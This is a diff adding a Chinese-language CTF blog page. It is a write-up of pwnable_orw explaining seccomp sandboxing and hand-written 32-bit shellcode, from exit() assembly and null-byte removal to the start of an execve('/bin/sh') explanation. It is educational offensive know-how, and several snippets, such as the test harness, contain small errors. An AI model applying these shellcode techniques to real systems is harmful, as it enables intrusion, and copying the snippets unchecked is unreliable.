@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>PWN-MaHo | SOME PEDLARY OF MAHO</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <meta name="description" content="pwnable_orw（重点为手写shellcode与沙盒orw机制）1.安全检测：
+
+32位操作系统
+Partial RELRO:got.plt可读可写
+无NX，堆栈可执行
+无地址随机化
+有读写权限
+
+
+2.IDA调试很明显提示写入shellcode，这道题连远程时，可以调falg文件，只需将其读">
+  
+  
+  
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+  
+  <link rel="stylesheet" href="../../../../css/style.css">
+  
+    <link rel="stylesheet" href="../../../../fancybox/jquery.fancybox-1.3.4.css">
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div id="nav-outer">
+  <nav id="main-nav" class="outer">
+    <a id="main-nav-toggle" class="nav-icon"></a>
+    
+      <a class="main-nav-link" href="../../../../index.html">Home</a>
+    
+      <a class="main-nav-link" href="../../../../archives">Archives</a>
+    
+    <div class="main-nav-space-between"></div>
+    
+  </nav>
+</div>
+<div id="header-title">
+  <h1 id="logo-wrap">
+    <a href="../../../../index.html" id="logo">SOME PEDLARY OF MAHO</a>
+  </h1>
+  
+</div>
+
+      <div id="content" class="outer">
+        <section id="main"><article id="post-pwnable_orw（重点为手写shellcode与沙盒orw机制）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="" class="article-date">
+  <time class="dt-published" datetime="2023-04-08T12:16:48.000Z" itemprop="datePublished">2023-04-08</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="../../../../categories/CTF-PWN/">CTF-PWN</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      PWN-MaHo
+    </h1>
+  
+
+      </header>
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="pwnable-orw（重点为手写shellcode与沙盒orw机制）"><a href="#pwnable-orw（重点为手写shellcode与沙盒orw机制）" class="headerlink" title="pwnable_orw（重点为手写shellcode与沙盒orw机制）"></a>pwnable_orw<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>重点为手写shellcode与沙盒orw机制<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span></h1><h2 id="1-安全检测："><a href="#1-安全检测：" class="headerlink" title="1.安全检测："></a>1.安全检测<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680616534477-d06bae33-4c05-46f5-9684-550f85e669a9.png#averageHue=%23494444&clientId=u99c38dd8-9f5b-4&from=drop&height=177&id=u47d6c387&name=1979919-20201015133023640-1470491081.png&originHeight=153&originWidth=403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15322&status=done&style=none&taskId=u4f22b48b-418b-452b-916b-faaf34c910b&title=&width=465" alt="1979919-20201015133023640-1470491081.png"></p>
+<ol>
+<li>32位操作系统</li>
+<li>Partial RELRO:got.plt可读可写</li>
+<li>无NX<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>堆栈可执行</li>
+<li>无地址随机化</li>
+<li>有读写权限</li>
+</ol>
+<p><a name="WG8Ea"></a></p>
+<h2 id="2-IDA调试"><a href="#2-IDA调试" class="headerlink" title="2.IDA调试"></a>2.IDA调试</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680616863482-7f15ec7b-9d92-4453-8bf4-678e057f73d8.png#averageHue=%23f8f7f7&clientId=u99c38dd8-9f5b-4&from=drop&height=492&id=u15110db7&name=1979919-20201015132957897-1984333421.png&originHeight=492&originWidth=872&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=43341&status=done&style=none&taskId=uacffb6ad-b5e3-43a5-81bf-1a67afec349&title=&width=872" alt="1979919-20201015132957897-1984333421.png"><br />很明显提示写入shellcode<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>这道题连远程时<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>可以调falg文件<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>只需将其读出来<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><strong>但</strong>存在orw_seccomp函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>禁用部分函数的程序调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>那么这道题的思路就是利用**_<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>可通行的函数<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>2<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>手写shellcode<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>3<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>读出flag_**<br />_<br><a name="Rg5pn"></a></p>
+<h2 id="3-什么是orw-seccomp函数（沙盒机制）"><a href="#3-什么是orw-seccomp函数（沙盒机制）" class="headerlink" title="3.什么是orw_seccomp函数（沙盒机制）"></a>3.什么是orw_seccomp函数<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>沙盒机制<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span></h2><ol>
+<li>简介<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><strong>seccomp</strong> 是 secure computing 的缩写<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>其是 Linux kernel 从2.6.23版本引入的一种简洁的 <strong>sandboxing 机制</strong><span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>在 Linux 系统里<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>大量的系统调用<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>system call<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span><strong>直接暴露给用户态程序</strong><span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>但是<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>并不是所有的系统调用都被需要<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>而且不安全的代码滥用系统调用会对系统造成安全威胁<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span>seccomp安全机制能使一个进程进入到一种<span class="bd-box"><h-char class="bd bd-end"><h-inner>“</h-inner></h-char></span>安全<span class="bd-box"><h-char class="bd bd-beg"><h-inner>”</h-inner></h-char></span>运行模式<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>该模式下的进程只能调用**<em>4种</em>**系统调用<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>system call<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>即 <strong><em>read(), write(), exit() 和 sigreturn()</em></strong><span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>否则进程便会被终止<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li>prctl 函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></li>
+</ol>
+<p>													</p>
+<pre><code class="c">#include &lt;sys/prctl.h&gt; 
+int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5); 
+</code></pre>
+<p>这里有5个参数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>重点看option就知道它是想干嘛<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>这里主要关注2点<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></p>
+<pre><code class="c">PR_SET_NO_NEW_PRIVS(38)
+
+PR_SET_SECCOMP(22)
+</code></pre>
+<p>我们通俗易懂地理解就是<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span><strong><em>prctl(38, 1LL, 0LL, 0LL, 0LL)表示禁用系统调用</em></strong><span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>也就是**<em>system和onegadget</em><strong>都没了,还会教子进程也这么干<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span>而</strong><em>prctl(22<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>2)</em><strong>表示设置沙箱规则<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>从而可以实现改变函数的系统调用<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>通行或者禁止<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>这次重点研究沙箱规则<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span></strong><em>设置 seccomp <span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>其实也就是设置沙箱规则</em>**<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></p>
+<ol start="3">
+<li>seccomo-tools的介绍<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></li>
+</ol>
+<ul>
+<li>seccomp-tools 是可以帮助我们查看哪些 syscall 被禁止的一个工具</li>
+<li>linux系统下载命令<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><ul>
+<li>sudo apt install gcc ruby-dev</li>
+<li>sudo gem install seccomp-tools</li>
+</ul>
+</li>
+<li>效果<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></li>
+<li><img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680618597738-6e8ec4a9-634c-4600-aea0-62dffe44232c.png#averageHue=%235b5884&clientId=u99c38dd8-9f5b-4&from=paste&height=285&id=dP7Fn&name=image.png&originHeight=348&originWidth=757&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=213578&status=done&style=none&taskId=uc26d7fc8-8e70-4579-9659-361c70d81a1&title=&width=621" alt="image.png"></li>
+<li>open<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>read<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>write三个函数可通行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+</ul>
+<ol start="4">
+<li>思路<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></li>
+</ol>
+<ul>
+<li>通过<strong>open</strong>函数打开当前目录下的 flag 文件</li>
+<li>利用<strong>read</strong>函数读取文件中的数据</li>
+<li>利用<strong>write</strong>函数将文件中的数据打印到屏幕上<br><a name="b8D42"></a></li>
+</ul>
+<h2 id="4-如何手撸一个满足题意的shellcode："><a href="#4-如何手撸一个满足题意的shellcode：" class="headerlink" title="4.如何手撸一个满足题意的shellcode："></a>4.如何手撸一个满足题意的shellcode<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h2><p><a name="FDR5N"></a></p>
+<h3 id="这里详细讲一下如何手写shellcode，以来打下坚实的基础-v-！嘿嘿"><a href="#这里详细讲一下如何手写shellcode，以来打下坚实的基础-v-！嘿嘿" class="headerlink" title="这里详细讲一下如何手写shellcode，以来打下坚实的基础+v+！嘿嘿~"></a>这里详细讲一下如何手写shellcode<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>以来打下坚实的基础+v+<span class="bd-box"><h-char class="bd bd-beg"><h-inner>！</h-inner></h-char></span>嘿嘿~</h3><p><a name="qzX1d"></a></p>
+<h4 id="1-什么是系统调用："><a href="#1-什么是系统调用：" class="headerlink" title="1.什么是系统调用："></a>1.什么是系统调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h4><ul>
+<li>shellcode是一组可注入的指令<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>可以在被攻击的程序中运行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>由于shellcode要直接操作寄存器和函数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>所以必须是十六进制数的形式</li>
+<li>为什么写shellcode<span class="bd-box"><h-char class="bd bd-beg"><h-inner>？</h-inner></h-char></span>因为我们要让目标程序以不同于设计者的预期进行运行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>而操作程序的方法之一是使程序产生系统调用<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>system call<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>通过系统调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>可以直接访问系统内核</li>
+<li>在liunx操作系统下有两个方式来执行系统调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>间接方式是利用c函数进行包装<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>直接方式是用会汇编指令<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>把适当的参数加载到寄存器之中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>利用int 0x80···进行软中断叼调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span></li>
+</ul>
+<p>下面示例exit<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>的系统调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></p>
+<pre><code class="c">int main(void)
+&#123;
+    exit(0);
+&#125;               
+/*编译时使用static选项&lt;span class=&quot;bd-box&quot;&gt;&lt;h-char class=&quot;bd bd-beg&quot;&gt;&lt;h-inner&gt;，&lt;/h-inner&gt;&lt;/h-char&gt;&lt;/span&gt;防止使用动态链接&lt;span class=&quot;bd-box&quot;&gt;&lt;h-char class=&quot;bd bd-beg&quot;&gt;&lt;h-inner&gt;，&lt;/h-inner&gt;&lt;/h-char&gt;&lt;/span&gt;在程序中保留exit函数的系统调用码*/
+</code></pre>
+<p>gcc -static -o exit exit.c<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680784416245-17cbf336-886f-401e-8602-3c544a073614.png#averageHue=%2335102a&clientId=u83927c19-ae8f-4&from=drop&height=261&id=ub5fda220&name=825468-20190430095125288-121259402.png&originHeight=426&originWidth=713&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=221271&status=done&style=none&taskId=u71036402-55b9-4cc0-8d80-4eadc12d1c2&title=&width=437" alt="825468-20190430095125288-121259402.png"></p>
+<ul>
+<li>_exit+0行是把系统调用的参数加载到ebx中</li>
+<li>_exit+4和_exit+15行是把对应的系统参数号分别复制给eax</li>
+<li>最后的int 0x80指令是把cpu转到内核模式<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>并执行系统调用<br><a name="GMwRc"></a></li>
+</ul>
+<h4 id="2-为exit（）系统调用写shellcode："><a href="#2-为exit（）系统调用写shellcode：" class="headerlink" title="2.为exit（）系统调用写shellcode："></a>2.为exit<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>系统调用写shellcode<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></h4><ul>
+<li>基本了解exit系统调用后<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>开始写shellcode</li>
+<li>注意的是应将shellcode尽量写的简介紧凑<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>目的是为了可以将其注入到更小的缓冲区</li>
+<li>在实际环境中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>shellcode将在没有其他指令为它设置参数的情况下执行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>所i我们要自己来进行参数传递</li>
+</ul>
+<p><strong><em>tips<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></em></strong></p>
+<ol>
+<li><strong><em>32位<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>参数放在栈上<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>编写shellcode时<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>函数传递参数寄存器顺序为<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>a,b,c,d,…..</em></strong></li>
+<li><strong><em>64位<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>前六个参数放在寄存器rdi<span class="bd-box"><h-char class="bd bd-beg"><h-inner>、</h-inner></h-char></span>rsi<span class="bd-box"><h-char class="bd bd-beg"><h-inner>、</h-inner></h-char></span>rdx<span class="bd-box"><h-char class="bd bd-beg"><h-inner>、</h-inner></h-char></span>rcx<span class="bd-box"><h-char class="bd bd-beg"><h-inner>、</h-inner></h-char></span>r8<span class="bd-box"><h-char class="bd bd-beg"><h-inner>、</h-inner></h-char></span>r9中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>其余的放在栈上<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></em></strong></li>
+</ol>
+<p><strong><em>具体步骤<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></em></strong></p>
+<ol>
+<li>把0存在ebx中</li>
+<li>把1存在eax中</li>
+<li>执行int 0x80来进行系统调用</li>
+</ol>
+<pre><code class="powershell">Section .text
+  global _start
+_start:
+  mov ebx, 0
+  mov ax, 1
+  int 0x80
+</code></pre>
+<p>然后用nasm编译<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>生成目标文件<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>再用gun ld来连接<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></p>
+<pre><code class="cpp">nasm -f elf32 exit_shellcode.asm
+ld -i exit_shellcode exit_shellcode.o
+</code></pre>
+<p>objdump看opcode<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680785434576-20286446-412a-457c-895f-7871a6c39b85.png#averageHue=%23340f28&clientId=u83927c19-ae8f-4&from=drop&height=164&id=u2a8bb79f&name=825468-20190430095140652-46296107.png&originHeight=189&originWidth=590&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=58852&status=done&style=none&taskId=u5e8f343b-12e2-4927-b3bf-eed1894ddc6&title=&width=512" alt="825468-20190430095140652-46296107.png"><br />看到shellcode中存在一些**<em>NULL<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>\x00<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span></em><strong>字符<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>当把shellcode复制到缓冲区中时<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>可能出现异常<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>因为字符数组用null做终止符<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>要编写真正有用的shellcode<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>我们</strong><em>务必</em>**把\x00消去</p>
+<ol>
+<li>这里看第一条指令<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>mov eb<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>0<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>将0放入ebx中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>可以利用xor指令<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>在操作数相等的情况下返回0<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>也就是说可以在指令中不使用0<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>但是结果返回零<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>那么我们就可以用xor来代替mov指令</li>
+</ol>
+<p>mov ebx, 0 –&gt; xor ebx, ebx</p>
+<ol start="2">
+<li>再看第二条指令<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>mov ax<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>1<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>为什么这条指令也会有null呢<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>我们知道<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>**<em>eax是32位<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>4字节<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>操作系统的寄存器<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>而我们只复制一个字节到了寄存器<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>而剩下的部分<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>系统会自动用null来填充<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span></em>**熟悉eax组成<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>分为两个16位区域<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>用ax可以访问第一个区域<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>而ax又分为al<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>低八位<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>和ah<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>高八位<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>两个区域<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>那么解决凡是就是只把1复制到al就行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+</ol>
+<pre><code class="c">Section .text
+    global _start
+_start:
+    xor ebx, ebx
+    mov al, 1
+    int 0x80
+</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680786897231-a0f75618-7fc5-4097-aa63-dd7a75c547b6.png#averageHue=%23340f28&clientId=u83927c19-ae8f-4&from=drop&height=154&id=u02f9c09a&name=825468-20190430095153996-533105127.png&originHeight=186&originWidth=618&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57676&status=done&style=none&taskId=u13bb998c-bbc6-43b8-b202-3699cee1c24&title=&width=512" alt="825468-20190430095153996-533105127.png"><br />消除\x00<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span></p>
+<ol start="3">
+<li>shellcode测试<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span></li>
+</ol>
+<pre><code class="c">  char shellcode[] = &quot;\x31\xdb&quot;
+                   &quot;\xb0\x01&quot;
+                   &quot;\xcd\x80&quot;;
+int main(void)
+&#123;
+    int *ret;
+    ret = (int *)&amp;ret + 2;
+    (&amp;ret) = (int)shellcode;
+&#125;
+</code></pre>
+<p>编译后用strace来查看系统调用<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680787019020-a6c8d8c3-be4b-493b-81ee-6c1b69980265.png#averageHue=%23330e28&clientId=u83927c19-ae8f-4&from=drop&height=373&id=uc4c93681&name=825468-20190430095205809-1392798026.png&originHeight=563&originWidth=770&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=296675&status=done&style=none&taskId=u0b5cc0ed-f987-4989-a10f-172fb7dc8a9&title=&width=510" alt="825468-20190430095205809-1392798026.png"><br><a name="nGxfE"></a></p>
+<h4 id="3-编写execve-的shellcode"><a href="#3-编写execve-的shellcode" class="headerlink" title="3.编写execve()的shellcode"></a><strong>3.编写execve()的shellcode</strong></h4><p>—–exit<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>可能没什么意思<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>接下来<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>我们做些更有趣的事情-派生root shell来控制整个目标系统<br />在linux系统中<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>有两种防止可以创建新进程<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>**<em>一</em><strong>是通过现有的进程来创建<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>并替换正在的活动<span class="bd-box"><h-char class="bd bd-beg"><h-inner>；</h-inner></h-char></span></strong><em>二</em>**是利用现有的进程来生成它自己的拷贝<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>并在它的位置运行这个新的进程<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span><br />execve<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>系统调用就是后者</p>
+<ol>
+<li>execve<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span>调用号是<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>11</li>
+<li>接下来我们需要知道它作为输入的参数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>用man手册就可以查看<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><ol>
+<li><img src="https://cdn.nlark.com/yuque/0/2023/png/33538857/1680787421714-88fafe05-c7e3-4b5a-9f54-f6dbc63ade60.png#averageHue=%23330e28&clientId=u83927c19-ae8f-4&from=drop&height=177&id=ub4726ec7&name=825468-20190430095227359-1998736984.png&originHeight=212&originWidth=766&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=74334&status=done&style=none&taskId=u4e97b575-1706-46d4-a352-89b521db345&title=&width=640" alt="825468-20190430095227359-1998736984.png"></li>
+<li>3个参数必须包含以下内容<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span><ol>
+<li>filename必须执行包含要执行的二进制文件的路径的字符串<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>这个例子中就是字符串[&#x2F;bin&#x2F;sh]<span class="bd-box"><h-char class="bd bd-beg"><h-inner>。</h-inner></h-char></span></li>
+<li><em><strong>argv[]是程序的参数列表<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>大多数程序将使用强制性&#x2F;选项参数进行运行<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>而我们只想执行&#x2F;bin&#x2F;sh<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>没有更多的参数<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>所以参数列表只是一个NULL指针<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>但是按照管理<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>第一个参数是我们要执行的文件名<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>所以argv[]就是[‘&#x2F;bin&#x2F;sh’<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>00000000]+v&#x3D;<span class="bd-box"><h-char class="bd bd-end"><h-inner>（</h-inner></h-char></span>划重点嘞<span class="bd-box"><h-char class="bd bd-beg"><h-inner>）</h-inner></h-char></span></strong></em></li>
+<li>envp[]是要以key<span class="bd-box"><h-char class="bd bd-beg"><h-inner>：</h-inner></h-char></span>value格式传递给程序的任何其他环境选项的列表<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>为了我们的目的<span class="bd-box"><h-char class="bd bd-beg"><h-inner>，</h-inner></h-char></span>这将是NULL指针\x00000000</li>
+</ol>
+</li>
+</ol>
+</li>
